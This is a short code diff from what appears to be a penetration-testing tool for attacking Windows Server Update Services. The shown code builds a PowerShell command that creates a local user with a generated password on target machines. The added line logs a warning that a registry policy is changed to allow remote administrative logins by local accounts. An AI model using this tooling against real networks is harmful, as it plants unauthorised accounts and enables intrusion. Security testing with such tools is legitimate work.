@@ -89,6 +89,7 @@ class Wsuks:
                 self.logger.success(f"Generated local user for the WSUS attack: Username={highlight(self.local_username, 'green')} Password={highlight(self.local_password, 'green')}")
                 create_user = f"New-LocalUser -Name {self.local_username} -Password $(ConvertTo-SecureString {self.local_password} -AsPlainText -Force) -Description $(\n{ps_script});\n"
                 self.command = str(args.command).format(CREATE_USER_COMMAND=create_user, WSUKS_USER=self.local_username)
+                self.logger.warning("WARNING: LocalAccountTokenFilterPolicy will be to 1 to allow remote administrative connections with local accounts. See README for details.")
         self.logger.success(f"Command to execute: \n{highlight(self.executable_name, 'yellow')} {highlight(self.command, 'yellow')}")
 
     def run(self):
